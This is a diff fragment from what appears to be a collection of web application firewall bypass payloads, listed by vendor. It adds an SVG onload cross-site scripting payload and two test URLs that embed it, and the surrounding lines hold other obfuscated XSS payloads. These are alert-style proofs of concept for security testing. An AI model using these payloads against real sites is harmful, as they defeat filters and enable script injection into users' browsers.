@@ -65,6 +65,12 @@ CloudFlare
 
 	<img src onerror=%26emsp;prompt`${document.domain}`>
 
+	XSS bypass 
+		<svg on onload=(alert)(document.domain)>
+		
+		https://waf.cumulusfire.net/?globalHtml=%3Csvg%20on%20onload=(alert)(document.domain)%3E
+		https://waf.cumulusfire.net/?attributeHtml=%3Csvg%20on%20onload=(alert)(document.domain)%3E
+
 
 Imperva
 	<bleh/onclick=top[/al/.source+/ert/.source] ``>click
